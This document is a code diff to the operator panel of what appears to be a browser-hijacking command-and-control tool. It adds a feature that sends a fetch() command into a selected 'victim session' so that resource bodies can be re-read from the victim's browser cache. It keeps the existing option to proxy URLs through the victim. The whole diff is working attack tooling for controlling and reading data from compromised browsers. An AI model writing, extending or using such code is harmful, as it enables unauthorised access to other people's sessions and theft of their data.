@@ -1024,15 +1024,23 @@ function renderNet(){
              +(r.req_headers?'<pre>'+esc(r.req_headers)+'</pre>':'')
              +(r.req_body?'<pre>'+esc(r.req_body)+'</pre>':'')
             :'')
-         +'<div class="ndet-sec">Response</div>'
-         +'<pre>'+esc(prettyBody(r.body||"(empty)", r.ct))+'</pre>'
-         +'<button class="ndet-pxbtn" data-pp="'+ni+'">'+(netPretty?"raw":"pretty")+'</button>'
-         +'<button class="ndet-pxbtn" data-pu="'+esc(r.url)+'">🔁 Proxy this URL</button>'
+         +(r.ro
+            ?'<div class="ndet-sec">Resource load</div>'
+             +'<div class="ndet-hdr">body/status not exposed by resource timing — re-fetch to capture the response</div>'
+             +'<button class="ndet-pxbtn" data-rf="'+esc(r.url)+'">🔁 Re-fetch body (GET · force-cache)</button>'
+             +'<button class="ndet-pxbtn" data-pu="'+esc(r.url)+'">🔁 Proxy this URL</button>'
+            :'<div class="ndet-sec">Response</div>'
+             +'<pre>'+esc(prettyBody(r.body||"(empty)", r.ct))+'</pre>'
+             +'<button class="ndet-pxbtn" data-pp="'+ni+'">'+(netPretty?"raw":"pretty")+'</button>'
+             +'<button class="ndet-pxbtn" data-pu="'+esc(r.url)+'">🔁 Proxy this URL</button>'
+            )
          +'</div></td></tr>':'');
   }).join("");
   ntbody.onclick=function(e){
     var ppb=e.target.closest("[data-pp]");
     if (ppb){ netPretty=!netPretty; renderNet(); return; }
+    var rfb=e.target.closest("[data-rf]");
+    if (rfb){ sendRefill(rfb.dataset.rf); return; }
     var pxl=e.target.closest("[data-pu]");
     if (pxl){ openProxy(pxl.dataset.pu); return; }
     var tr=e.target.closest("tr[data-ni]"); if (!tr) return;
@@ -1504,6 +1512,14 @@ $("pxsendbtn").addEventListener("click",function(){
 });
 
 /* ═══════════ Probe panel ═══════════ */
+function sendRefill(url){
+  if (!active){ appendErr("No victim session — select a session first"); return; }
+  var cmd = "fetch("+JSON.stringify(url)+",{cache:'force-cache'}).catch(function(e){return String(e)})";
+  fetch("/api/send",{method:"POST",body:JSON.stringify({id:active,cmd:cmd})})
+    .then(function(r){ return r.json(); })
+    .then(function(m){ if (m.ok===false) appendErr("Send failed: "+(m.error||"")); })
+    .catch(function(err){ appendErr("fetch error: "+err); });
+}
 function loadProbes(){
   fetch("/api/probes").then(function(r){ return r.json(); }).then(function(rows){
     probeRows = rows || [];
